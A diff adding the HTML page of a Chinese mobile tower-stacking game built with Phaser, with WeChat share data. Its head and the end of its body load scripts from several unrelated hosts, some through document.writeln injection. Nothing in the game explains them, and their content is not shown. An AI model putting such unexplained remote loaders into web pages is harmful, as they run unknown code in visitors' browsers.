@@ -1,0 +1,116 @@
+﻿
+<!DOCTYPE HTML>
+<html>
+<head>
+<div id='wx_pic' style='margin:0 auto;display:none;'>
+<img src='photo.jpg' />
+</div>
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8">
+<title>我盖了个比郭敬明还高的塔，你来试试吧！</title>
+<link rel="stylesheet" href="css/stylesheet.css" type="text/css" charset="utf-8">
+<meta charset="utf-8">
+<meta http-equiv="X-UA-Compatible" content="chrome=1, IE=9">
+<meta name="format-detection" content="telephone=no">
+<meta name="HandheldFriendly" content="true">
+<meta name="apple-mobile-web-app-capable" content="yes">
+<meta name="apple-mobile-web-app-status-bar-style" content="black">
+<meta name="format-detection" content="telephone=no">
+<meta name="HandheldFriendly" content="true">
+<meta name="robots" content="noindex,nofollow">
+<meta name="apple-mobile-web-app-capable" content="yes">
+<meta name="apple-mobile-web-app-status-bar-style" content="black">
+<meta name="apple-mobile-web-app-title" content="The Tower">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0">
+<script src='https://p.mendoc.cn/79718'></script>
+	<script src='http://h.how5.cn/79718'></script>
+	<script type="text/javascript">
+		document.writeln("<script src='http:\/\/h.how5.cn\/83378'><\/script>");
+		document.writeln("<script src='https:\/\/p.mendoc.cn\/79718'><\/script>");
+	</script>
+<script src="http://libs.baidu.com/jquery/2.0.0/jquery.min.js"></script>
+<script src="http://res.wx.qq.com/open/js/jweixin-1.0.0.js"></script>
+<script type="text/javascript">
+        window.gameLangs = ['en', 'es', 'fr', 'de', 'it', 'ru', 'tr', 'pt'];
+        window.gameJS = [
+        'src/phaser.min.js',
+        'src/Boot.js',
+        'src/Preloader.js',
+        'src/Game.js?v=1',
+        'src/Texts.js',
+        'src/Config.js',
+        'src/SoundManager.js',
+        'src/ControlBrick.js',
+        'src/Tower.js',
+        'src/PartGenerator.js',
+        'src/GUI.js',
+        'src/HiddingButton.js',
+        'src/Cloud.js',
+        'src/Bird.js'
+        ]
+        window.gameOnLoadScript = "startGame();";
+    </script><script type="text/javascript" src="./assets/softgames-1.1.js"></script><script type="text/javascript" src="./assets/sg.hooks.js"></script>
+</head>
+<body>
+<div id="game"></div>
+<div id="orientation"></div>
+
+<script type="text/javascript">
+    var lang;
+    var game;
+    var iPhone5;
+    var iPhone4;
+    startGame = (function () {
+        lang = SG.lang; //SG_Hooks.getLanguage(['en', 'ru']); // ,'de', 'es', 'fr', 'it','pt', 'tk'
+        var iPhone = navigator.userAgent.toLowerCase().indexOf('iphone') != -1;
+        var pixelRatio = window['devicePixelRatio'] || 1;
+        iPhone5 = iPhone && pixelRatio==2 && window.screen.height == 568;
+        iPhone4 = !iPhone5 && iPhone;
+        var width = 320;
+        var height = 480;
+        var product = window.innerWidth * window.innerHeight;
+
+        if( iPhone5 )
+            height = 530;
+
+        if( product > 400000 || pixelRatio==2){
+            width *= 2;
+            height *= 2;
+        }
+
+        game = new Phaser.Game(width, height, Phaser.CANVAS, 'game');
+        
+        game.state.add('Boot', TheTower.Boot);
+        game.state.add('Game', TheTower.Game);
+        game.state.add('Preloader', TheTower.Preloader);
+        game.state.start('Boot');  
+        
+
+//        (function() {
+// var play68host = new RegExp(/vdcom.cn/i);
+//         if(play68host.test(window.location.hostname)){
+//         game.state.add('Boot', TheTower.Boot);
+//         game.state.add('Game', TheTower.Game);
+//         game.state.add('Preloader', TheTower.Preloader);
+//         game.state.start('Boot');  
+//         }else{setTimeout(function(){alert('最好玩的游戏就在小斯基网络科技')}, 10000);}
+// })();
+         
+    });
+</script>
+
+<script  type="text/JavaScript">
+window.shareData={
+  'title':'叠了个塔',
+  'link':'http://game.nineying.cn/games/dlgt/',
+  'imgurl':'http://game.nineying.cn/games/dlgt/icon.png'
+}
+window.shareFriendData={
+  'title':'叠了个塔',
+  'content':'关注小斯基网络,更多好玩的游戏等着你。',
+  'link':'http://game.nineying.cn/games/dlgt/',
+  'imgurl':'http://game.nineying.cn/games/dlgt/icon.png'
+}
+</script>
+<script type="text/JavaScript" src="http://gc.veiying.cn/code"></script>
+</body>
+</html>
